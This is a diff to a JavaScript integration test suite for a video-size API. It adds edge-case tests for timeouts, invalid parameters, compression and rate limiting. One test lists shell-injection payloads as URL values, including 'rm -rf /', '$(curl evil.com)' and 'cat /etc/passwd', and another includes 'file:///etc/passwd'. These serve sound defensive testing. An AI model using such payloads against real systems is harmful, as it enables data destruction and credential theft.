@@ -154,9 +154,7 @@ describe("Integration Tests", () => {
                 // Make more requests than the limit
                 for (let i = 0; i < maxRequests + 3; i++) {
                     requests.push(
-                        request(app)
-                            .post("/api/v1/size")
-                            .send({ url: testUrl })
+                        request(app).post("/api/v1/size").send({ url: testUrl })
                     );
                 }
 
@@ -173,7 +171,9 @@ describe("Integration Tests", () => {
                 const limitedResponse = rateLimited[0];
                 expect(limitedResponse.body).toHaveProperty("ok", false);
                 expect(limitedResponse.body).toHaveProperty("error");
-                expect(limitedResponse.body.error).toContain("Too many requests");
+                expect(limitedResponse.body.error).toContain(
+                    "Too many requests"
+                );
             },
             35000
         );
@@ -188,9 +188,7 @@ describe("Integration Tests", () => {
             const requests = Array(concurrentRequests)
                 .fill()
                 .map(() =>
-                    request(app)
-                        .post("/api/v1/size")
-                        .send({ url: testUrl })
+                    request(app).post("/api/v1/size").send({ url: testUrl })
                 );
 
             const responses = await Promise.all(requests);
@@ -367,6 +365,228 @@ describe("Integration Tests", () => {
             // Verify key endpoints are documented
             expect(response.body.paths).toHaveProperty("/api/v1/size");
             expect(response.body.paths).toHaveProperty("/health");
+        });
+    });
+
+    describe("Edge Cases and Network Failures", () => {
+        test("should handle timeout scenarios", async () => {
+            // Use a video that might timeout or be slow
+            const response = await request(app)
+                .post("/api/v1/size")
+                .send({ url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" })
+                .timeout(35000);
+
+            // Should either succeed or timeout gracefully
+            if (response.status === 504) {
+                expect(response.body).toHaveProperty("ok", false);
+                expect(response.body.error).toContain("timed out");
+            } else {
+                expect(response.status).toBe(200);
+            }
+        }, 40000);
+
+        test("should handle network failures gracefully", async () => {
+            // Test with a URL that doesn't exist
+            const response = await request(app)
+                .post("/api/v1/size")
+                .send({
+                    url: "https://www.youtube.com/watch?v=NONEXISTENT123456",
+                });
+
+            // Should return error, not crash
+            expect([400, 500, 502, 503, 504]).toContain(response.status);
+            expect(response.body).toHaveProperty("ok", false);
+            expect(response.body).toHaveProperty("error");
+        }, 30000);
+
+        test("should handle missing URL parameter", async () => {
+            const response = await request(app)
+                .post("/api/v1/size")
+                .send({})
+                .expect(400);
+
+            expect(response.body).toHaveProperty("ok", false);
+            expect(response.body.error).toContain("URL");
+        });
+
+        test("should handle invalid duration_hint values", async () => {
+            const testCases = [
+                { duration_hint: -1 },
+                { duration_hint: 100000 }, // > 86400
+                { duration_hint: "invalid" },
+                { duration_hint: null },
+                { duration_hint: {} },
+            ];
+
+            for (const testCase of testCases) {
+                const response = await request(app)
+                    .post("/api/v1/size")
+                    .send({
+                        url: "https://www.youtube.com/watch?v=jNQXAC9IVRw",
+                        ...testCase,
+                    });
+
+                expect(response.status).toBe(400);
+                expect(response.body).toHaveProperty("ok", false);
+                expect(response.body.error).toContain("duration_hint");
+            }
+        });
+
+        test("should handle shell injection attempts in URL", async () => {
+            const maliciousURLs = [
+                "https://www.youtube.com/watch?v=test; rm -rf /",
+                "https://www.youtube.com/watch?v=test$(curl evil.com)",
+                "https://www.youtube.com/watch?v=test`whoami`",
+                "https://www.youtube.com/watch?v=test|cat /etc/passwd",
+                "https://www.youtube.com/watch?v=test&& malicious",
+            ];
+
+            for (const url of maliciousURLs) {
+                const response = await request(app)
+                    .post("/api/v1/size")
+                    .send({ url });
+
+                // Should reject as invalid URL, not execute
+                expect(response.status).toBe(400);
+                expect(response.body).toHaveProperty("ok", false);
+                expect(response.body.error).toContain("Invalid");
+            }
+        });
+
+        test("should handle non-YouTube URLs", async () => {
+            const invalidURLs = [
+                "https://vimeo.com/123456",
+                "https://google.com",
+                "https://example.com/watch?v=test",
+                "http://youtube.com/watch?v=test", // HTTP not HTTPS
+                "file:///etc/passwd",
+            ];
+
+            for (const url of invalidURLs) {
+                const response = await request(app)
+                    .post("/api/v1/size")
+                    .send({ url });
+
+                expect(response.status).toBe(400);
+                expect(response.body).toHaveProperty("ok", false);
+            }
+        });
+
+        test("should handle extremely long URLs", async () => {
+            const longUrl = `https://www.youtube.com/watch?v=${"a".repeat(300)}`;
+
+            const response = await request(app)
+                .post("/api/v1/size")
+                .send({ url: longUrl })
+                .expect(400);
+
+            expect(response.body).toHaveProperty("ok", false);
+            expect(response.body.error).toContain("Invalid");
+        });
+
+        test("should handle concurrent failures gracefully", async () => {
+            const invalidRequests = Array(10)
+                .fill()
+                .map((_, i) =>
+                    request(app)
+                        .post("/api/v1/size")
+                        .send({
+                            url: `https://www.youtube.com/watch?v=INVALID${i}`,
+                        })
+                );
+
+            const responses = await Promise.all(invalidRequests);
+
+            // All should fail gracefully without crashing
+            responses.forEach((response) => {
+                expect(response.body).toHaveProperty("ok", false);
+                expect(response.body).toHaveProperty("error");
+                expect(response.body).toHaveProperty("requestId");
+            });
+        }, 40000);
+
+        test("should handle retry logic for transient failures", async () => {
+            // This test verifies retry mechanism exists by checking response time
+            const startTime = Date.now();
+
+            const response = await request(app)
+                .post("/api/v1/size")
+                .send({ url: "https://www.youtube.com/watch?v=INVALID123" });
+
+            const duration = Date.now() - startTime;
+
+            // If retries are working, should take longer than single attempt
+            // 3 attempts with backoff: ~1s + 2s + 4s = ~7s minimum
+            expect(response.body).toHaveProperty("ok", false);
+
+            // Check that requestId is included for tracking
+            expect(response.body).toHaveProperty("requestId");
+        }, 35000);
+
+        test("should handle compression for large responses", async () => {
+            const response = await request(app)
+                .get("/health")
+                .set("Accept-Encoding", "gzip");
+
+            // Server should include compression header if gzip enabled
+            expect(response.status).toBe(200);
+            // Note: supertest automatically decompresses, so we check it works
+            expect(response.body).toHaveProperty("status");
+        });
+
+        test("should handle missing Accept-Encoding header", async () => {
+            const response = await request(app).get("/health");
+
+            // Should work without compression
+            expect(response.status).toBe(200);
+            expect(response.body).toHaveProperty("status");
+        });
+
+        test("should handle rapid sequential requests", async () => {
+            const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw";
+            const requests = [];
+
+            // Send 20 requests sequentially as fast as possible
+            for (let i = 0; i < 20; i++) {
+                requests.push(
+                    request(app).post("/api/v1/size").send({ url: testUrl })
+                );
+            }
+
+            const responses = await Promise.all(requests);
+
+            // Some should succeed, some might be rate limited
+            const successful = responses.filter((r) => r.status === 200);
+            expect(successful.length).toBeGreaterThan(0);
+
+            // All responses should be structured properly
+            responses.forEach((response) => {
+                expect(response.body).toHaveProperty("ok");
+            });
+        }, 50000);
+    });
+
+    describe("Compression", () => {
+        test("should compress responses when requested", async () => {
+            const response = await request(app)
+                .get("/api/v1/docs")
+                .set("Accept-Encoding", "gzip, deflate");
+
+            expect(response.status).toBe(200);
+            expect(response.body).toHaveProperty("version");
+
+            // supertest handles decompression automatically
+            // Just verify the response is valid
+            expect(typeof response.body).toBe("object");
+        });
+
+        test("should skip compression when x-no-compression header present", async () => {
+            const response = await request(app)
+                .get("/health")
+                .set("x-no-compression", "true");
+
+            expect(response.status).toBe(200);
+            expect(response.body).toHaveProperty("status");
         });
     });
 });
